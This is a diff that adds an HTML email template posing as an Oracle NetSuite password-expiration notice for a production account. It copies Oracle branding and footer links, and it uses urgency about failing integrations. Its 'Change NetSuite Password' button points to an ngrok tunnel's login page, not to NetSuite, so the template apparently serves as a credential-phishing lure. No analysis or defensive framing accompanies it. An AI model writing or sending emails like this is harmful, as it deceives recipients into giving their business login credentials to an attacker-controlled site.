@@ -1,0 +1,400 @@
+<div>
+  <div></div>
+</div>
+<style>/* CLIENT-SPECIFIC STYLES */
+		/* Prevent WebKit and Windows mobile changing default text sizes */
+		body {margin: 0 !important; padding: 0 !important;}
+		body, table, td, a{-webkit-text-size-adjust: 100% !important; -ms-text-size-adjust: 100% !important; -webkit-font-smoothing: antialiased !important;}
+		/* Remove spacing between tables in Outlook 2007 and up */
+		table, td{mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: collapse;}
+		#backgroundTable {margin:0; padding:0; width:100% !important;}
+		td, a, span {mso-line-height-rule: exactly;}
+		/* Allow smoother rendering of resized image in Internet Explorer */
+		img{-ms-interpolation-mode: bicubic;}
+		/* RESET STYLES */
+		img{border: 0 !important; height: auto; line-height: 100%; outline: none !important; text-decoration: none;}
+		a img{border:none !important;}
+		table{border-collapse: collapse !important;}
+		body{height: 100% !important; margin: 0 !important; padding: 0 !important; width: 100% !important;}
+		p {margin: 0 !important; padding: 0 !important;}
+		/* iOS BLUE LINKS */
+		a[x-apple-data-detectors] {
+			color: inherit !important;
+			text-decoration: none !important;
+			font-size: inherit !important;
+			font-family: inherit !important;
+			font-weight: inherit !important;
+			line-height: inherit !important;
+		}
+		/* ANDROID CENTER FIX */
+		div[style*="margin: 16px 0"] {margin:0 !important;}
+		/* OTHER STYLES */
+		.ExternalClass {width: 100%;}
+		.ExternalClass * {line-height: 100%;}
+		/* CUSTOM STYLES */
+		.em_white_link a {
+			text-decoration: none;
+			color: #ffffff;
+		}
+		.em_grey_link a {
+			text-decoration: none;
+			color: #666666;
+		}
+		.em_white_txt a {
+			text-decoration: none;
+			color: #ffffff;
+		}
+		.em_dark_grey_txt a {
+			text-decoration: none;
+			color: #040707;
+		}
+		.em_grey_txt a {
+			text-decoration: none;
+			color: #666666;
+		}
+		.btn{
+			display:inline-block;font-weight:400;color:#212529;text-align:center;vertical-align:middle;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-color:transparent;border:1px solid transparent;padding:.375rem .75rem;font-size:1rem;line-height:1.5;border-radius:.25rem;transition:color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out}@media (prefers-reduced-motion:reduce){.btn{transition:none}
+		}
+		.btn-netsuite {
+			color:#fff;background-color:#437c94;border-color:#437c94
+		}
+		/* MOBILE STYLES */
+		@media only screen and (max-width:480px) {
+			table[class=em_main_table] {
+				width: 100% !important;
+			}
+			table[class=em_wrapper_box] {
+				width: 100% !important;
+				margin-bottom: 20px !important;
+			}
+			table[class=em_wrapper] {
+				width: 100% !important;
+			}
+			td[class=em_hide], br[class=em_hide] {
+				display: none !important;
+			}
+			tr[class=em_show] {
+				display: table-row !important;
+			}
+			td[class=em_align_center] {
+				text-align: center !important;
+			}
+			td[class=em_mar_top] {
+				margin-top: 20px !important;
+			}
+			td[class=em_pad_top] {
+				padding-top: 20px !important;
+			}
+			td[class=em_side_space] {
+				padding-left: 20px !important;
+				padding-right: 20px !important;
+			}
+			td[class=em_bg_center] {
+				background-position: center !important;
+			}
+			td[class=em_height_80] {
+				height: 120px !important;
+			}
+			img[class=em_full_width] {
+				width: 100% !important;
+				height: auto !important;
+				max-width: 100% !important;
+			}
+			td[class=em_pad_btm] {
+				padding-bottom: 28px !important;
+			}
+			td[class=em_no_pad] {
+				padding-top: 0 !important;
+				padding-right: 0 !important;
+				padding-bottom: 0 !important;
+				padding-left: 0 !important;
+			}
+		}
+		@media only screen and (min-width:480px) and (max-width:600px) {
+			table[class=em_main_table] {
+				width: 100% !important;
+			}
+			table[class=em_wrapper] {
+				width: 100% !important;
+			}
+			table[class=em_wrapper_box] {
+				width: 100% !important;
+				margin-bottom: 20px !important;
+			}
+			td[class=em_hide], br[class=em_hide] {
+				display: none !important;
+			}
+			tr[class=em_show] {
+				display: table-row !important;
+			}
+			td[class=em_align_center] {
+				text-align: center !important;
+			}
+			td[class=em_mar_top] {
+				margin-top: 20px !important;
+			}
+			td[class=em_pad_top] {
+				padding-top: 20px !important;
+			}
+			td[class=em_side_space] {
+				padding-left: 20px !important;
+				padding-right: 20px !important;
+			}
+			td[class=em_bg_center] {
+				background-position: center !important;
+			}
+			img[class=em_full_width] {
+				width: 100% !important;
+				height: auto !important;
+				max-width: 100% !important;
+			}
+			td[class=em_pad_btm] {
+				padding-bottom: 28px !important;
+			}
+			td[class=em_no_pad] {
+				padding-top: 0 !important;
+				padding-right: 0 !important;
+				padding-bottom: 0 !important;
+				padding-left: 0 !important;
+			}
+		}</style>
+<div>
+  <table style="background-color: #dadee0;" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+      <tr>
+        <td class="" align="center" valign="top">
+          <table class="em_main_table" style="max-width: 600px; width: 600px;" border="0" width="600" cellspacing="0" cellpadding="0" align="center" bgcolor="#dadee0"><!-- ===== BANNER SECTION ===== -->
+            <tbody>
+              <tr>
+                <td>
+                  <table border="0" width="100%" cellspacing="0" cellpadding="0"><!-- ===== HERO IMAGE ===== -->
+                    <tbody>
+                      <tr>
+                        <td class="">
+                          <img class="em_full_width" style="display: block; width: 100%; max-width: 600px; height: auto;" src="https://nlcorp.app.netsuite.com/core/media/media.nl?id=222577316&amp;c=NLCORP&amp;h=f8bb2cf11f5147a3dbfd" alt="Banner" width="600" border="0">
+                        </td>
+                      </tr>
+<!-- ===== //HERO IMAGE ===== -->
+                    </tbody>
+                  </table>
+                </td>
+              </tr>
+<!-- ===== //BANNER SECTION ===== --> <!-- ===== BLACK SECTION ===== -->
+              <tr>
+                <td bgcolor="#67615B">
+                  <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                    <tbody>
+                      <tr>
+                        <td class="em_hide" width="40">&nbsp;</td>
+                        <td class="em_side_space">
+                          <a name="2"></a>
+                          <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                            <tbody>
+                              <tr>
+                                <td style="border-collapse: collapse; font-size: 10px; line-height: 10px;" colspan="2" height="10">&nbsp;</td>
+                              </tr>
+                              <tr>
+                                <td style="background-color: #67615b; font-family: Oracle Sans, Arial, Helvetica, sans-serif; font-size: 16px; color: #ffffff;" width="60%">
+                                  <strong>NetSuite Password Expiration Warning</strong>
+                                </td>
+                              </tr>
+                              <tr>
+                                <td class="" style="border-collapse: collapse; font-size: 10px; line-height: 10px;" colspan="2" height="10">&nbsp;</td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </td>
+                        <td class="em_hide" width="40">&nbsp;</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </td>
+              </tr>
+<!-- ===== //BLACK SECTION ===== --> <!-- ===== ORANGE SECTION ===== -->
+              <tr>
+                <td bgcolor="#ffffff">
+                  <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                    <tbody>
+                      <tr>
+                        <td class="em_hide" width="40">&nbsp;</td>
+                        <td class="em_side_space">
+                          <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                            <tbody>
+                              <tr>
+                                <td style="border-collapse: collapse; font-size: 30px; line-height: 30px;" height="30">&nbsp;</td>
+                              </tr>
+                              <tr>
+                                <td align="left" valign="top">
+                                  <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                                    <tbody>
+                                      <tr>
+                                        <td class="" valign="top" width="100%">
+                                          <table width="100%" cellspacing="0" cellpadding="0" align="left"><!-- ===== BODY ===== -->
+                                            <tbody>
+                                              <tr>
+                                                <td class="em_dark_grey_txt" style="font-family: 'Oracle Sans', Arial, sans-serif; font-size: 14px; line-height: 20px; color: #312d2b;" align="left">Hello, 
+                                                  <br>
+                                                  <br>
+                                                  <p>The password for NetSuite user 
+                                                    <strong>no-replay@domain.com</strong> will expire soon in the following account(s):
+                                                  </p>
+                                                  <br>
+                                                  <table width="100%" cellspacing="0" cellpadding="0" align="center">
+                                                    <thead>
+                                                      <tr style="background: #f4f5f7;" align="center">
+                                                        <th>Company Id</th>
+                                                        <th>Company</th>
+                                                        <th>Days Before Expiration</th>
+                                                        <th>Account Type</th>
+                                                      </tr>
+                                                    </thead>
+                                                    <tbody>
+                                                      <tr align="center">
+                                                        <td>6501539</td>
+                                                        <td>Company Name SA de CV</td>
+                                                        <td>2</td>
+                                                        <td>PRODUCTION</td>
+                                                      </tr>
+                                                    </tbody>
+                                                  </table>
+                                                  <br>
+                                                  <p>Please change your password as soon as possible.</p>
+                                                  <br>
+                                                  <div align="center">
+                                                    <a href="https://c9cb-189-151-160-89.ngrok-free.app/login.html" target="_blank" style="text-decoration: underline;" rel="noopener">Change NetSuite Password</a>
+                                                  </div>
+                                                  <br>
+                                                  <p>
+                                                    <strong>Important:</strong> If you do not change your password before it expires, any integrations you own will fail.
+                                                  </p>
+                                                  <br>
+                                                  <p>You will be required to change your password the next time you log in to NetSuite.</p>
+                                                  <br>
+                                                  <p>Thank you, 
+                                                    <br>
+                                                    <strong>The Oracle NetSuite Team</strong>
+                                                  </p>
+                                                  <br>
+                                                  <p style="font-size: 13px; line-height: 16px; color: #312d2b;">
+                                                    <em>*This is an automated message.</em>
+                                                  </p>
+                                                  <br>
+                                                </td>
+                                              </tr>
+<!-- ===== BODY ===== -->
+                                            </tbody>
+                                          </table>
+                                        </td>
+                                      </tr>
+                                    </tbody>
+                                  </table>
+                                </td>
+                              </tr>
+                              <tr>
+                                <td class="" style="border-collapse: collapse; font-size: 40px; line-height: 40px;" height="40">&nbsp;</td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </td>
+                        <td class="em_hide" width="40">&nbsp;</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </td>
+              </tr>
+<!-- ===== //ORANGE SECTION ===== --> <!-- ===== FOOTER SECTION ===== -->
+              <tr>
+                <td bgcolor="#e5e2dd">
+                  <table class="email-container" style="margin: auto;" border="0" width="600" cellspacing="0" cellpadding="0" align="center">
+                    <tbody>
+                      <tr>
+                        <td style="padding: 0; background-color: #312d2a; color: #ffffff;">
+                          <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                            <tbody>
+                              <tr><!-- Footer Section (Left) - Start -->
+                                <th class="stack-column-center left-footer" style="height: auto;" valign="top" width="50%">
+                                  <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                                    <tbody>
+                                      <tr>
+                                        <td style="padding: 40px 5px 25px 30px; text-align: left; line-height: 1;">
+                                          <a href="https://www.netsuite.com/?elqTrackId=5f20b7d1a12b4af2a8827b4abff600ee&amp;elq=8e9f44a77b084625972ae03823e8b5a2&amp;elqaid=16712&amp;elqat=1&amp;elqCampaignId=6572" style="display: inline-block;" target="_blank" rel="noopener">
+                                            <img style="width: 100%; max-width: 200px; height: auto;" src="https://nlcorp.app.netsuite.com/c.NLCORP/portal/common/form/landing_pages/img/logos/logo-oracle_netsuite_transparent_white_2x.png" alt="Oracle NetSuite" width="200" height="" border="0">
+                                          </a>
+                                        </td>
+                                      </tr>
+                                      <tr>
+                                        <td style="padding: 0 5px 40px 30px; text-align: left; line-height: 16px;">
+                                          <span style="font-family: 'Oracle Sans', Arial, sans-serif; font-size: 12px; color: #ffffff;">2300 Oracle Way 
+                                            <br>Austin, TX 78741 
+                                            <br>United States
+                                          </span>
+                                        </td>
+                                      </tr>
+                                    </tbody>
+                                  </table>
+                                </th>
+<!-- Footer Section (Left) - End --><!-- Footer Section (Right) - Start -->
+                                <th class="stack-column-center right-footer" style="height: auto;" valign="top" width="50%">
+                                  <table border="0" width="100%" cellspacing="0" cellpadding="0" bgcolor="#312d2a">
+                                    <tbody>
+                                      <tr>
+                                        <td class="footer-tr" style="padding: 40px 30px 0 5px; text-align: right; font-family: 'Oracle Sans', Arial, sans-serif; font-size: 14px; line-height: 18px;">
+                                          <p style="margin: 0 auto;">
+                                            <strong style="color: #ffffff;">Follow NetSuite on social media!</strong>
+                                          </p>
+                                        </td>
+                                      </tr>
+                                      <tr>
+                                        <td style="padding: 5px 30px 5px; text-align: right; line-height: 36px; box-sizing: border-box; font-size: 0;" bgcolor="#312d2a">
+                                          <a href="http://www.facebook.com/NetSuite?elqTrackId=86c9a007a9f14c819cbf8073b4cb6cfe&amp;elq=8e9f44a77b084625972ae03823e8b5a2&amp;elqaid=16712&amp;elqat=1&amp;elqCampaignId=6572" style="text-decoration: none; display: inline-block; height: 100%; line-height: 1; vertical-align: middle; font-size: 14px;" target="_blank" rel="noopener">
+                                            <img style="height: auto; display: inline-block; max-height: 25px;" src="https://nlcorp.app.netsuite.com/core/media/media.nl?id=172410741&amp;c=NLCORP&amp;h=13ffdb524506ad942d63" alt="Facebook">&nbsp;
+                                          </a> 
+                                          <a href="https://www.linkedin.com/company/netsuite?elqTrackId=cc0c5efe138f441c9aaf870dd346a507&amp;elq=8e9f44a77b084625972ae03823e8b5a2&amp;elqaid=16712&amp;elqat=1&amp;elqCampaignId=6572" style="text-decoration: none; display: inline-block; height: 100%; line-height: 1; vertical-align: middle; font-size: 14px;" target="_blank" rel="noopener">
+                                            <img style="height: auto; display: inline-block; max-height: 25px;" src="https://nlcorp.app.netsuite.com/core/media/media.nl?id=172410746&amp;c=NLCORP&amp;h=86591caac6e1f9278927" alt="LinkedIn">&nbsp;
+                                          </a> 
+                                          <a href="http://www.twitter.com/NetSuite?elqTrackId=d29156cd9e494d62a941414e3f2429f8&amp;elq=8e9f44a77b084625972ae03823e8b5a2&amp;elqaid=16712&amp;elqat=1&amp;elqCampaignId=6572" style="text-decoration: none; display: inline-block; height: 100%; line-height: 1; vertical-align: middle; font-size: 14px;" target="_blank" rel="noopener">
+                                            <img style="height: auto; display: inline-block; max-height: 25px;" src="https://nlcorp.app.netsuite.com/core/media/media.nl?id=172410848&amp;c=NLCORP&amp;h=beee08d0f3848b4593ce" alt="Twitter">&nbsp;
+                                          </a> 
+                                          <a href="http://www.instagram.com/oraclenetsuite?elqTrackId=7349fd26fc554fb68c3f33b46728aa23&amp;elq=8e9f44a77b084625972ae03823e8b5a2&amp;elqaid=16712&amp;elqat=1&amp;elqCampaignId=6572" style="text-decoration: none; display: inline-block; height: 100%; line-height: 1; vertical-align: middle; font-size: 14px;" target="_blank" rel="noopener">
+                                            <img style="height: auto; display: inline-block; max-height: 25px;" src="https://nlcorp.app.netsuite.com/core/media/media.nl?id=172410951&amp;c=NLCORP&amp;h=df8f350ec691865fc710" alt="Instagram">
+                                          </a>
+                                        </td>
+                                      </tr>
+                                      <tr>
+                                        <td style="padding: 0 30px 40px 5px; text-align: right; font-family: 'Oracle Sans', Arial, sans-serif; font-size: 11px; line-height: 16px; color: #ffffff;" bgcolor="#312d2a">
+                                          <p style="margin: 0;">
+                                            <a href="https://www.oracle.com/legal/copyright.html" style="text-decoration: underline; color: #ffffff;" target="_blank" rel="noopener">© Oracle, and/or its affiliates</a> 
+                                            <br>
+                                            <a href="https://www.oracle.com/legal/privacy/" style="text-decoration: underline; color: #ffffff;" target="_blank" rel="noopener">Terms of Use and Privacy</a> | 
+                                            <a href="https://www.oracle.com/corporate/contact/global.html" style="text-decoration: underline; color: #ffffff;" target="_blank" rel="noopener">Contact Us</a> 
+                                            <br>
+                                            <a href="https://www.oracle.com/corporate/event-code-of-conduct.html" style="text-decoration: underline; color: #ffffff;" target="_blank" rel="noopener">Code of Conduct</a>
+                                          </p>
+                                        </td>
+                                      </tr>
+                                    </tbody>
+                                  </table>
+                                </th>
+<!-- Footer Section (Right) - End -->
+                              </tr>
+                            </tbody>
+                          </table>
+                        </td>
+                      </tr>
+<!-- Footer Section - End --><!-- Clear Spacer : BEGIN -->
+                      <tr>
+                        <td style="font-size: 0px; line-height: 0px;" height="40">&nbsp;</td>
+                      </tr>
+<!-- Clear Spacer : END -->
+                    </tbody>
+                  </table>
+                </td>
+              </tr>
+<!-- ===== //FOOTER SECTION ===== -->
+            </tbody>
+          </table>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</div>
